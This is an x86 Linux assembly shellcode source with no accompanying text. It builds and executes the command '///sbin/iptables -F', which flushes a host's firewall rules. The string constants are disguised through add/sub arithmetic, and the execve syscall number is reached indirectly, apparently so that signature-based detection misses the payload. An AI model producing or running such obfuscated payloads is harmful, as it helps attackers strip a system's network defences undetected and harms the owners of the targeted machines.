section .text
	global _start

_start:

	xor eax,eax
	push eax
	push word 0x462d
	mov esi,esp
	push eax
;	push dword 0x73656c62
	mov ebx, 0x61535A50
	add ebx, 0x12121212
	push ebx
;	push dword 0x61747069
	sub ebx, 0x11F0FBF9
	push ebx
;	push dword 0x2f6e6962
	sub ebx, 0x32060707
	push ebx
;	push dword 0x732f2f2f
	add ebx, 0x43c0c5cd
	push ebx
	mov ebx,esp
	push eax
	push esi
	push ebx
	mov ecx,esp
	mov edx,eax
	;mov al,0xb
	mov al,0xa
	inc al
	int 0x80

